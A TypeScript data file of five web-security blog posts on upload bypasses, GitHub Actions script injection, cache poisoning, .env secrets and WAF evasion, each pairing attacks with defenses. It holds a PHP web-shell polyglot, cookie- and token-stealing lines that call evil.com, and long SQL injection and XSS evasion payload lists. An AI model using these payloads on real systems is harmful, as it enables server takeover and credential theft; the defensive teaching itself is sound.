import { BlogPost } from "./blog-data";

export const trafficBatch4Articles: BlogPost[] = [
  {
    slug: "file-upload-vulnerabilities-bypass-techniques-defense",
    title: "File Upload Vulnerabilities: Bypass Techniques & Bulletproof Defenses",
    excerpt:
      "Double extensions, magic bytes, polyglot files — attackers bypass file upload validation in creative ways. Here's every technique and how to build upload security that actually works.",
    content: `## Why File Uploads Are the Most Dangerous Feature

File upload is one of the most exploited web application features. A successful upload bypass can lead to **Remote Code Execution (RCE)** — giving an attacker full control of your server.

| Upload Attack | Impact |
|--------------|--------|
| Web shell upload | Full server compromise |
| Stored XSS via SVG/HTML | Account hijacking |
| Server-Side Request Forgery via SVG | Internal network access |
| Path traversal in filename | Overwrite critical files |
| Zip bomb / decompression bomb | Denial of service |
| Polyglot files (GIFAR) | Bypass content-type checks |

---

## Bypass Technique 1: Extension Manipulation

\`\`\`bash
# Server blocks .php — try these:
shell.php.jpg          # Double extension
shell.php%00.jpg       # Null byte (older systems)
shell.pHp              # Case variation
shell.php5             # Alternative extension
shell.phtml            # Alternative extension
shell.php.            # Trailing dot (Windows)
shell.php::$DATA       # NTFS alternate data stream (Windows)
shell.php%0a           # Newline character
shell.p.h.p            # Dot insertion
\`\`\`

### Defense: Allowlist Extensions + Generate New Filenames

\`\`\`typescript
import path from 'path';
import crypto from 'crypto';

const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf']);

function validateAndRename(originalName: string): string {
  // Normalize and get extension
  const ext = path.extname(originalName).toLowerCase();
  
  // ✅ Strict allowlist
  if (!ALLOWED_EXTENSIONS.has(ext)) {
    throw new Error('File type not allowed');
  }
  
  // ✅ Generate new random filename (never use original name)
  const newName = crypto.randomUUID() + ext;
  return newName;
}
\`\`\`

---

## Bypass Technique 2: Content-Type Spoofing

\`\`\`bash
# Server checks Content-Type header — but it's client-controlled!
curl -X POST https://target.com/upload \\
  -F "file=@shell.php;type=image/jpeg"
  
# Burp Suite: Intercept upload, change Content-Type to image/jpeg
\`\`\`

### Defense: Verify Magic Bytes (File Signature)

\`\`\`typescript
import { fileTypeFromBuffer } from 'file-type';

async function validateFileContent(buffer: Buffer): Promise<string> {
  const type = await fileTypeFromBuffer(buffer);
  
  if (!type) throw new Error('Unknown file type');
  
  const ALLOWED_MIMES = new Set([
    'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf'
  ]);
  
  if (!ALLOWED_MIMES.has(type.mime)) {
    throw new Error(\\\`File type \${type.mime} not allowed\\\`);
  }
  
  return type.ext;
}
\`\`\`

---

## Bypass Technique 3: Polyglot Files

A polyglot file is valid as **multiple file types** simultaneously. A GIFAR is both a valid GIF and a valid JAR.

\`\`\`bash
# Create a GIF that's also valid PHP
# GIF magic bytes: GIF89a
echo -e 'GIF89a\\n<?php system($_GET["cmd"]); ?>' > polyglot.gif

# The file passes image validation but executes as PHP if served with .php extension
\`\`\`

### Defense: Re-encode Images

\`\`\`typescript
import sharp from 'sharp';

async function sanitizeImage(buffer: Buffer): Promise<Buffer> {
  // ✅ Re-encoding strips any embedded code
  return sharp(buffer)
    .jpeg({ quality: 90 })  // Force re-encode as JPEG
    .toBuffer();
  // The output is a clean JPEG — no embedded PHP, no XSS, no metadata
}
\`\`\`

---

## Bypass Technique 4: SVG XSS

SVG files are XML that can contain JavaScript:

\`\`\`xml
<!-- malicious.svg — Stored XSS when rendered in browser -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://evil.com/steal?c=' + document.cookie)
  </script>
</svg>
\`\`\`

### Defense: Strip SVG Scripts or Block SVGs Entirely

\`\`\`typescript
// Option 1: Block SVG uploads entirely (recommended)
// Option 2: Serve with Content-Type: image/svg+xml AND
//   Content-Security-Policy: script-src 'none'
//   Content-Disposition: attachment (force download, no render)
\`\`\`

---

## Bypass Technique 5: Path Traversal in Filename

\`\`\`bash
# Filename: ../../../etc/cron.d/backdoor
# If the server uses the original filename without sanitization,
# the file could be written to a dangerous location
\`\`\`

### Defense: Strip Path Components

\`\`\`typescript
function sanitizeFilename(filename: string): string {
  // Remove path components
  const base = path.basename(filename);
  // Remove special characters
  const clean = base.replace(/[^a-zA-Z0-9._-]/g, '');
  // Better: don't use original filename at all
  return crypto.randomUUID() + path.extname(clean).toLowerCase();
}
\`\`\`

---

## Complete Secure Upload Implementation

\`\`\`typescript
import multer from 'multer';
import sharp from 'sharp';
import { fileTypeFromBuffer } from 'file-type';
import crypto from 'crypto';
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';

const ALLOWED_TYPES = new Map([
  ['image/jpeg', '.jpg'],
  ['image/png', '.png'],
  ['image/webp', '.webp'],
  ['application/pdf', '.pdf'],
]);

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: MAX_FILE_SIZE, files: 1 },
});

app.post('/upload', upload.single('file'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  
  let buffer = req.file.buffer;
  
  // Step 1: Verify magic bytes
  const type = await fileTypeFromBuffer(buffer);
  if (!type || !ALLOWED_TYPES.has(type.mime)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  
  // Step 2: Re-encode images (strips embedded code)
  if (type.mime.startsWith('image/')) {
    buffer = await sharp(buffer)
      .resize(2000, 2000, { fit: 'inside', withoutEnlargement: true })
      .jpeg({ quality: 85 })
      .toBuffer();
  }
  
  // Step 3: Generate random filename
  const filename = crypto.randomUUID() + '.jpg';
  
  // Step 4: Upload to separate domain/bucket
  await s3.send(new PutObjectCommand({
    Bucket: process.env.UPLOAD_BUCKET,
    Key: \\\`uploads/\${filename}\\\`,
    Body: buffer,
    ContentType: 'image/jpeg',
    ContentDisposition: 'inline',
  }));
  
  // Step 5: Return CDN URL (separate from app domain)
  const url = \\\`https://cdn.myapp.com/uploads/\${filename}\\\`;
  res.json({ url });
});
\`\`\`

---

## Upload Security Checklist

- [ ] Allowlist file extensions (never blocklist)
- [ ] Verify magic bytes with file-type library
- [ ] Re-encode images with sharp/ImageMagick (strips payloads)
- [ ] Generate random filenames (never use originals)
- [ ] Store uploads on separate domain/CDN (prevents cookie access)
- [ ] Set Content-Disposition and correct Content-Type headers
- [ ] Size limits enforced server-side
- [ ] Virus scanning for non-image uploads (ClamAV)
- [ ] No execution permissions on upload directory
- [ ] Rate limiting on upload endpoints`,
    date: "2026-02-23",
    author: "Abhishek Tiwari",
    category: "Application Security",
    tags: ["file upload", "web shell", "bypass", "rce", "xss", "svg", "upload security"],
    readTime: "14 min read",
  },
  {
    slug: "github-actions-security-vulnerabilities-hardening",
    title: "GitHub Actions Security: Script Injection, Secret Leaks & Hardening Your CI/CD",
    excerpt:
      "GitHub Actions workflows are a goldmine for attackers — script injection via PR titles, secret exfiltration, and supply chain attacks through third-party actions.",
    content: `## Why GitHub Actions Is a High-Value Target

GitHub Actions runs code with access to your **source code, secrets, cloud credentials, and deployment pipelines**. A compromised workflow means compromised production.

| Risk | Impact |
|------|--------|
| Script injection | Run arbitrary commands in your CI |
| Secret exfiltration | Steal API keys, deploy tokens |
| Supply chain attack | Compromised third-party action |
| Privilege escalation | PR from fork gains write access |
| Artifact poisoning | Tampered build outputs |

---

## Vulnerability 1: Script Injection via Expressions

The most common and dangerous vulnerability. GitHub expressions (\`\${{ }}\`) are evaluated **before the shell runs** — they're string interpolation, not safe variables.

### ❌ Vulnerable Workflow

\`\`\`yaml
name: Greet PR Author
on: pull_request

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Thanks for the PR, \${{ github.event.pull_request.title }}!"
\`\`\`

An attacker creates a PR with title:

\`\`\`
"; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "
\`\`\`

The workflow executes:

\`\`\`bash
echo "Thanks for the PR, "; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "!"
\`\`\`

### Vulnerable Contexts (User-Controlled)

\`\`\`
github.event.pull_request.title
github.event.pull_request.body
github.event.issue.title
github.event.issue.body
github.event.comment.body
github.event.review.body
github.event.head_commit.message
github.head_ref (branch name)
\`\`\`

### ✅ Fixed: Use Environment Variables

\`\`\`yaml
- name: Greet safely
  env:
    PR_TITLE: \${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR: $PR_TITLE"
    # $PR_TITLE is now a shell variable — NOT interpolated into the script
\`\`\`

---

## Vulnerability 2: Secret Exfiltration

\`\`\`yaml
# ❌ Secrets available to all steps including untrusted code
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test  # If tests run user-contributed code, secrets can be stolen
    env:
      AWS_ACCESS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
      DATABASE_URL: \${{ secrets.DATABASE_URL }}
\`\`\`

### ✅ Minimize Secret Exposure

\`\`\`yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test  # No secrets here

  deploy:
    needs: test
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          AWS_ACCESS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
        run: ./deploy.sh
\`\`\`

---

## Vulnerability 3: Dangerous pull_request_target

\`pull_request_target\` runs with write permissions and access to secrets — even for PRs from forks!

\`\`\`yaml
# ❌ EXTREMELY DANGEROUS — runs forked PR code with write access + secrets
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}  # Checks out FORKED code!
      - run: npm install && npm test  # Runs attacker's code with your secrets
\`\`\`

### ✅ Safe Pattern

\`\`\`yaml
on: pull_request_target

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # ✅ Only checkout BASE repo code, not fork code
      - uses: actions/checkout@v4
        # No ref override — checks out base branch (safe)
      
      # ✅ Only run trusted scripts from your own repo
      - run: ./scripts/label-pr.sh
\`\`\`

---

## Vulnerability 4: Third-Party Action Supply Chain

\`\`\`yaml
# ❌ Using mutable tag — author can push malicious update
- uses: some-author/helpful-action@v1

# ❌ Using branch — changes anytime
- uses: some-author/helpful-action@main

# ✅ Pin to exact commit SHA
- uses: some-author/helpful-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2

# ✅ Even better — use GitHub's official actions (well-maintained)
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
\`\`\`

### Automate Dependency Updates (Dependabot for Actions)

\`\`\`yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
\`\`\`

---

## Hardened Workflow Template

\`\`\`yaml
name: Secure CI/CD

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# ✅ Minimal permissions at workflow level
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm test

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment: production  # ✅ Requires manual approval
    permissions:
      contents: read
      id-token: write  # ✅ OIDC — no long-lived secrets
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy  # ✅ OIDC, no keys
          aws-region: us-east-1
      - run: ./deploy.sh
\`\`\`

---

## GitHub Actions Security Checklist

- [ ] Never use \`\${{ }}\` expressions directly in \`run:\` with user-controlled values
- [ ] Pin third-party actions to full commit SHAs
- [ ] Set minimal \`permissions:\` at workflow and job level
- [ ] Use \`environment:\` with required approvals for production deploys
- [ ] Use OIDC (\`id-token: write\`) instead of long-lived cloud credentials
- [ ] Never checkout fork code with \`pull_request_target\`
- [ ] Limit secret access to only the jobs/steps that need them
- [ ] Set \`timeout-minutes:\` to prevent runaway jobs
- [ ] Enable Dependabot for GitHub Actions dependencies
- [ ] Audit workflow runs for unexpected commands`,
    date: "2026-02-20",
    author: "Abhishek Tiwari",
    category: "DevSecOps",
    tags: ["github actions", "ci/cd", "supply chain", "script injection", "devops security", "secrets"],
    readTime: "15 min read",
  },
  {
    slug: "web-cache-poisoning-attacks-cdn-security",
    title: "Web Cache Poisoning: How Attackers Weaponize CDNs and Reverse Proxies",
    excerpt:
      "Cache poisoning turns your CDN into an attack amplifier — serving malicious content to every visitor. Learn the mechanics, real-world exploits, and how to defend against it.",
    content: `## What Is Web Cache Poisoning?

Web cache poisoning tricks a caching layer (CDN, reverse proxy, load balancer) into storing a **malicious response** and serving it to all subsequent visitors.

\`\`\`
Normal flow:
  User → CDN Cache (cached /page) → 200 OK (clean page)

Poisoned flow:
  Attacker → Origin Server → 200 OK (malicious response injected via headers)
         ↓
  CDN Cache stores poisoned response
         ↓
  ALL subsequent visitors → CDN Cache → 200 OK (malicious page!)
\`\`\`

> **Impact:** One request from an attacker → XSS/defacement/phishing served to **every visitor** until cache expires.

---

## How Cache Poisoning Works

The attack relies on **unkeyed inputs** — parts of the request that the cache ignores when generating the cache key, but the origin server uses in the response.

### Cache Key vs. Full Request

\`\`\`
Full Request:
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com     ← Unkeyed (not in cache key)
  Accept-Language: en              ← Unkeyed
  Cookie: session=abc123           ← Usually unkeyed

Cache Key (what CDN uses to match requests):
  GET target.com/page
  
The CDN sees the same "page" for all visitors, regardless of 
X-Forwarded-Host or Accept-Language headers.
\`\`\`

---

## Attack 1: X-Forwarded-Host Header Poisoning

Many frameworks use \`X-Forwarded-Host\` to generate absolute URLs for assets, links, and redirects.

\`\`\`bash
# Attacker's request
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Origin response (using X-Forwarded-Host for asset URLs)
<html>
  <script src="https://evil.com/assets/main.js"></script>
  <link rel="stylesheet" href="https://evil.com/assets/style.css">
</html>

# CDN caches this response for the cache key "GET target.com/"
# All visitors now load JavaScript from evil.com!
\`\`\`

### Defense

\`\`\`typescript
// ✅ Never use X-Forwarded-Host without validation
const ALLOWED_HOSTS = ['target.com', 'www.target.com'];

function getHost(req: Request): string {
  const forwarded = req.headers['x-forwarded-host'];
  if (forwarded && ALLOWED_HOSTS.includes(String(forwarded))) {
    return String(forwarded);
  }
  return req.headers.host || ALLOWED_HOSTS[0];
}

// ✅ Better: Use a fixed base URL from config
const BASE_URL = process.env.BASE_URL; // https://target.com
\`\`\`

---

## Attack 2: Unkeyed Header Reflection

\`\`\`bash
# Find headers reflected in response
GET / HTTP/1.1
Host: target.com
X-Custom-Header: <script>alert(1)</script>

# If the response includes:
# <meta name="custom" content="<script>alert(1)</script>">
# And the CDN caches it — stored XSS for all visitors
\`\`\`

### Testing Methodology

\`\`\`bash
# Step 1: Find unkeyed headers using Param Miner (Burp extension)
# Or manually test common headers:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Forwarded-Proto
X-Host

# Step 2: Check if header value appears in response
# Step 3: Verify the response gets cached (check Age, X-Cache headers)
# Step 4: Confirm other users get the cached poisoned response
\`\`\`

---

## Attack 3: Fat GET / POST Body Poisoning

Some caching systems treat GET requests with a body the same as regular GETs.

\`\`\`bash
# Cache key: GET /api/user (no body considered)
GET /api/user HTTP/1.1
Host: target.com
Content-Length: 30

{"role": "admin", "id": "1"}

# If the origin uses the body to customize the response,
# the cache stores the admin response for /api/user
# All users now see admin data!
\`\`\`

---

## Attack 4: Cache Key Normalization Exploits

\`\`\`bash
# Some CDNs normalize URLs before generating cache keys:
# /page and /PAGE might share the same cache key
# /page and /page? might share the same cache key

# But the origin server might treat them differently,
# allowing you to poison the normalized version
\`\`\`

---

## Detection: Check Your Cache Headers

\`\`\`bash
# Look for these response headers to understand caching behavior
curl -sI https://target.com | grep -i 'cache\\|age\\|x-cache\\|cf-cache\\|vary'

# Key headers:
# Cache-Control: max-age=3600        → Response is cached for 1 hour
# Age: 542                           → Response has been cached for 542 seconds
# X-Cache: HIT                       → Response served from cache
# Vary: Accept-Encoding              → Cache key includes Accept-Encoding
# CF-Cache-Status: DYNAMIC           → Cloudflare not caching (safe)
\`\`\`

---

## CDN-Specific Defenses

### Cloudflare

\`\`\`
# Cache Rules → Only cache static assets
# Page Rules → Cache Level: Bypass for dynamic pages
# Transform Rules → Strip unrecognized headers before origin
\`\`\`

### CloudFront

\`\`\`json
{
  "CacheBehavior": {
    "ForwardedValues": {
      "Headers": ["Host"],
      "QueryString": true
    },
    "CachePolicy": {
      "HeadersConfig": {
        "HeaderBehavior": "whitelist",
        "Headers": ["Host", "Accept-Encoding"]
      }
    }
  }
}
\`\`\`

---

## Cache Poisoning Prevention Checklist

- [ ] Use fixed base URLs — never generate URLs from request headers
- [ ] Strip unknown/custom headers at the CDN/proxy level
- [ ] Ensure \`Vary\` header includes all inputs that affect the response
- [ ] Don't cache responses that vary based on cookies or custom headers
- [ ] Cache only static assets — bypass cache for dynamic/personalized content
- [ ] Set \`Cache-Control: private, no-store\` for authenticated responses
- [ ] Monitor cache HIT rates for anomalies
- [ ] Test with tools like Param Miner to find unkeyed inputs
- [ ] Use \`Surrogate-Control\` or \`CDN-Cache-Control\` for CDN-specific cache rules`,
    date: "2026-02-17",
    author: "Abhishek Tiwari",
    category: "Application Security",
    tags: ["cache poisoning", "cdn", "cloudflare", "web security", "xss", "reverse proxy", "headers"],
    readTime: "14 min read",
  },
  {
    slug: "securing-env-files-environment-variables-best-practices",
    title: "Securing .env Files & Environment Variables: The Definitive Guide",
    excerpt:
      "Hardcoded secrets in .env files are the #1 source of credential leaks on GitHub. Learn secure storage, rotation, vault integration, and 12-factor app patterns.",
    content: `## The .env File Problem

Every week, GitHub detects **millions of hardcoded secrets** pushed to repositories. The leading source? \`.env\` files that were accidentally committed.

| Source | Secrets Leaked (2025) |
|--------|----------------------|
| .env files committed to Git | 42% |
| Hardcoded in source code | 28% |
| Exposed in CI/CD logs | 15% |
| Shared via Slack/email | 9% |
| Docker images | 6% |

*Source: GitGuardian State of Secrets Sprawl 2025*

---

## Rule 1: Never Commit .env Files

\`\`\`gitignore
# .gitignore — MUST include these
.env
.env.local
.env.*.local
.env.production
.env.staging
*.pem
*.key
\`\`\`

### What If You Already Committed a .env?

\`\`\`bash
# Remove from tracking (keeps the file locally)
git rm --cached .env
echo '.env' >> .gitignore
git add .gitignore
git commit -m "Remove .env from tracking"

# ⚠️ The secret is STILL in Git history!
# You must rotate every credential that was exposed

# To fully remove from history (destructive):
git filter-branch --force --index-filter \\
  'git rm --cached --ignore-unmatch .env' \\
  --prune-empty --tag-name-filter cat -- --all
git push origin --force --all
\`\`\`

> **Critical:** Even after removing the file from history, consider every secret in that file **compromised**. Rotate all credentials immediately.

---

## Rule 2: Use .env.example (Not .env) for Documentation

\`\`\`bash
# .env.example — Commit this (no real values!)
DATABASE_URL=postgres://user:password@localhost:5432/myapp
REDIS_URL=redis://localhost:6379
JWT_SECRET=generate-a-random-secret-here
STRIPE_SECRET_KEY=sk_test_your_test_key
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
\`\`\`

\`\`\`bash
# .env.local — Never commit this (actual secrets)
DATABASE_URL=postgres://admin:r3alP@ssw0rd@prod-db.internal:5432/myapp
REDIS_URL=redis://:auth-token@redis.internal:6379
JWT_SECRET=a1b2c3d4e5f6...64-char-random-string
STRIPE_SECRET_KEY=sk_live_51ABC123DEF456...
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
\`\`\`

---

## Rule 3: Validate Environment Variables at Startup

\`\`\`typescript
// lib/env.ts — Validate ALL env vars on startup
import { z } from 'zod';

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  REDIS_URL: z.string().url(),
  JWT_SECRET: z.string().min(32, 'JWT secret must be at least 32 characters'),
  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
  NODE_ENV: z.enum(['development', 'staging', 'production']),
  PORT: z.coerce.number().default(3000),
});

// This throws on startup if ANY variable is missing or invalid
export const env = envSchema.parse(process.env);
\`\`\`

\`\`\`typescript
// Usage — type-safe, validated access
import { env } from '@/lib/env';

const db = new PrismaClient({ datasources: { db: { url: env.DATABASE_URL } } });
// If DATABASE_URL is missing, the app fails at startup — not at runtime
\`\`\`

---

## Rule 4: Use a Secrets Vault for Production

### HashiCorp Vault

\`\`\`bash
# Store secrets
vault kv put secret/myapp \\
  database_url="postgres://..." \\
  jwt_secret="..."

# Read in application
vault kv get -format=json secret/myapp | jq -r '.data.data.database_url'
\`\`\`

### AWS Secrets Manager

\`\`\`typescript
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(name: string): Promise<Record<string, string>> {
  const response = await client.send(
    new GetSecretValueCommand({ SecretId: name })
  );
  return JSON.parse(response.SecretString!);
}

// Usage
const secrets = await getSecret('myapp/production');
const db = new PrismaClient({ datasources: { db: { url: secrets.DATABASE_URL } } });
\`\`\`

---

## Rule 5: Never Log Environment Variables

\`\`\`typescript
// ❌ DANGEROUS — secrets end up in log files
console.log('Config:', process.env);
console.log('DB URL:', process.env.DATABASE_URL);
console.log('Starting with JWT secret:', process.env.JWT_SECRET);

// ✅ Log only safe information
console.log('Starting server on port:', process.env.PORT);
console.log('Environment:', process.env.NODE_ENV);
console.log('Database connected:', !!process.env.DATABASE_URL);
\`\`\`

---

## Rule 6: Framework-Specific Pitfalls

### Next.js

\`\`\`bash
# ❌ NEXT_PUBLIC_ variables are embedded in CLIENT-SIDE JavaScript
NEXT_PUBLIC_API_KEY=sk_secret_key  # EXPOSED TO BROWSER!

# ✅ Server-only variables (no NEXT_PUBLIC_ prefix)
DATABASE_URL=postgres://...
JWT_SECRET=...

# ✅ Only public-safe values get NEXT_PUBLIC_
NEXT_PUBLIC_APP_URL=https://myapp.com
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_...
\`\`\`

### Docker

\`\`\`dockerfile
# ❌ NEVER bake secrets into images
ENV DATABASE_URL=postgres://admin:password@db/myapp

# ✅ Use runtime injection
# docker run -e DATABASE_URL=postgres://... myapp

# ✅ Or Docker Secrets
# docker secret create db_url ./secret.txt
\`\`\`

---

## Secret Rotation Checklist

When rotating secrets, follow this order:

1. Generate new secret
2. Update in vault/secrets manager
3. Deploy application with new secret
4. Verify application works
5. Revoke old secret
6. Audit for any remaining usage of old secret

\`\`\`bash
# Generate strong secrets
openssl rand -hex 32          # 64-char hex string
openssl rand -base64 32       # 44-char base64 string
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
\`\`\`

---

## Environment Variable Security Checklist

- [ ] \`.env\` in \`.gitignore\` — verified in every repo
- [ ] \`.env.example\` committed with placeholder values
- [ ] Environment variables validated at startup (Zod)
- [ ] Production secrets in vault (AWS Secrets Manager, Vault, etc.)
- [ ] No \`NEXT_PUBLIC_\` prefix on server-only secrets
- [ ] No secrets in Dockerfiles or docker-compose.yml
- [ ] No secrets logged via console.log or error handlers
- [ ] Secret rotation schedule (quarterly minimum)
- [ ] GitHub secret scanning alerts enabled
- [ ] Pre-commit hooks to detect secrets (gitleaks, trufflehog)`,
    date: "2026-02-14",
    author: "Abhishek Tiwari",
    category: "DevSecOps",
    tags: ["env files", "environment variables", "secrets management", "gitignore", "vault", "dotenv", "12-factor"],
    readTime: "14 min read",
  },
  {
    slug: "waf-bypass-techniques-web-application-firewall",
    title: "WAF Bypass Techniques: How Hackers Evade Web Application Firewalls",
    excerpt:
      "WAFs aren't invincible. Learn the encoding tricks, request smuggling, and obfuscation techniques attackers use to bypass ModSecurity, Cloudflare WAF, and AWS WAF.",
    content: `## Why WAFs Get Bypassed

Web Application Firewalls (WAFs) work by matching requests against known attack patterns (signatures). But attackers have creative ways to deliver the same payload in a format the WAF doesn't recognize.

> **Rule of thumb:** A WAF is a speed bump, not a wall. It buys time but doesn't replace input validation and parameterized queries.

---

## Bypass Category 1: Encoding & Obfuscation

### URL Encoding

\`\`\`bash
# Original XSS payload (blocked)
<script>alert(1)</script>

# Single URL encoded
%3Cscript%3Ealert(1)%3C/script%3E

# Double URL encoded (if WAF decodes once, app decodes twice)
%253Cscript%253Ealert(1)%253C/script%253E

# Mixed encoding
%3Cscript%3Eal\\u0065rt(1)%3C/script%3E
\`\`\`

### HTML Entity Encoding

\`\`\`html
<!-- Original (blocked) -->
<img src=x onerror=alert(1)>

<!-- Decimal entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex entities -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Mixed with null bytes -->
<img src=x onerror="al\\x65rt(1)">
\`\`\`

### Unicode Normalization

\`\`\`bash
# WAF blocks "SELECT" but not Unicode equivalents
# Using fullwidth characters:
ＳＥＬＥＣＴ * ＦＲＯＭ users

# Using combining characters
SELECT\\u0000 * FROM users
\`\`\`

---

## Bypass Category 2: SQL Injection WAF Evasion

\`\`\`sql
-- Original (blocked)
' OR 1=1--

-- Comment injection
'/**/OR/**/1=1--

-- Inline comments
'/*!50000OR*/1=1--

-- Case variation
' oR 1=1--

-- Alternative syntax
' || 1=1--
' -0 OR 1=1--

-- Whitespace alternatives
'%09OR%091=1--     /* Tab character */
'%0aOR%0a1=1--     /* Newline */
'%0dOR%0d1=1--     /* Carriage return */

-- String concatenation to avoid keyword detection
SE'+'LECT * FR'+'OM users
CONCAT('SEL','ECT') (MySQL)

-- Alternative to UNION SELECT
' AND 1=2 UNION ALL SELECT table_name,2 FROM information_schema.tables--
\`\`\`

---

## Bypass Category 3: XSS WAF Evasion

\`\`\`html
<!-- WAF blocks <script> -->

<!-- Event handlers instead -->
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">click</a>
<a href="javas&#x09;cript:alert(1)">click</a>

<!-- Template literals (modern JS) -->
<img src=x onerror=alert\`1\`>

<!-- Constructor -->
<img src=x onerror="[].constructor.constructor('alert(1)')()">

<!-- Without parentheses -->
<img src=x onerror="window.onerror=alert;throw 1">
<img src=x onerror="location='javascript:alert\\x281\\x29'">
\`\`\`

---

## Bypass Category 4: HTTP Request Smuggling

Exploits differences in how the WAF and backend server parse HTTP:

\`\`\`
# CL-TE smuggling (WAF uses Content-Length, backend uses Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
\`\`\`

The WAF sees one valid POST request. The backend sees two requests — including a smuggled GET to /admin.

---

## Bypass Category 5: Content-Type Confusion

\`\`\`bash
# WAF inspects application/x-www-form-urlencoded and application/json
# But might skip other content types

# multipart/form-data (often less inspected)
POST /search HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="query"

' OR 1=1--
------Boundary--

# text/plain (CSRF-friendly, often not inspected)
POST /api HTTP/1.1
Content-Type: text/plain

{"query":"' OR 1=1--"}
\`\`\`

---

## Bypass Category 6: IP-Based Evasion

\`\`\`bash
# If WAF blocks by IP after detection:
# Rotate through multiple IPs
# Use cloud function IPs (AWS Lambda, Cloudflare Workers)
# Use IPv6 addresses (many WAFs only check IPv4)

# Host header manipulation
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
\`\`\`

---

## How to Defend Against WAF Bypasses

### 1. Defense in Depth — WAF + Application Security

\`\`\`typescript
// ✅ The WAF is a LAYER, not a replacement for secure code

// Always use parameterized queries (no bypass possible)
const users = await db.query('SELECT * FROM users WHERE id = $1', [userInput]);

// Always sanitize output (no XSS bypass possible)
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(userContent);
\`\`\`

### 2. WAF Tuning

\`\`\`
- Enable paranoia level 2+ in ModSecurity CRS
- Block requests with multiple encodings
- Normalize Unicode before inspection
- Inspect ALL content types (not just form/JSON)
- Log and review false positives to tune rules
- Enable request body inspection (not just URL/headers)
\`\`\`

### 3. Content Security Policy

\`\`\`
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
\`\`\`

Even if an XSS payload bypasses the WAF, CSP prevents script execution.

---

## Key Takeaways

1. **WAFs catch ~95% of automated attacks** — they're valuable but not sufficient
2. **Targeted attackers will bypass any WAF** given enough time
3. **Input validation + parameterized queries + output encoding = actual security**
4. **WAF + CSP + input validation = defense in depth**

Treat your WAF as a noisy alarm system, not a locked door. The real security lives in your code.`,
    date: "2026-02-11",
    author: "Abhishek Tiwari",
    category: "Application Security",
    tags: ["waf", "bypass", "web application firewall", "xss", "sql injection", "cloudflare", "modsecurity"],
    readTime: "15 min read",
  },
];
